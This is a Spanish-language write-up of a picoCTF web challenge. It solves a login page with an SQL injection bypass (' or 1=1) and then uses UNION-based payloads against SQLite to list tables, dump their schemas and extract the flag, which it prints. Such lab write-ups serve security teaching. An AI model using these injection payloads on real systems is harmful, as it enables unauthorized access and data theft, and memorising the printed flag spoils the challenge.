
## DESCRIPCIÓN
Do you think you can log us in? Try to see if you can login!

http://saturn.picoctf.net:55873/
## SOLUCIÓN
Una vez ingresado en la pagina y tratar de loguearse nos muestra:

username: admin
password: ....
SQL query: SELECT id FROM users WHERE password = '....' AND username = 'admin'

Entonces observamos que primero verifica la contraseña y fespues el usuario, para traspasarlo hacemos sqlinjection en el label de password, y colocamos cualquier cosa en username:

username: admin
password: loquesea' or 1=1; 

y entramos a la pagina, en el search office hacemos primero una consulta para ver la cantidad de tablas que se consultan

```
ciudad' union select 1,2,3; #Revisamos que se consultan 3 campos

ciudad' union select sqlite_version(),2,3; #Observamos que es en sqlite y su version.

ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ;
#Obtenemos todas las tablas que existen

ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ;
#Observamos las querys de las tablas

ciudad' union select 1,2,flag from more_table;
#Obtenemos la flag en el tercer campo
```

Estas son las tablas:

```

CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)

CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)

CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)

CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)
```
y obtenemos la flag:

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}
## NOTAS ADICIONALES

## REFERENCIAS





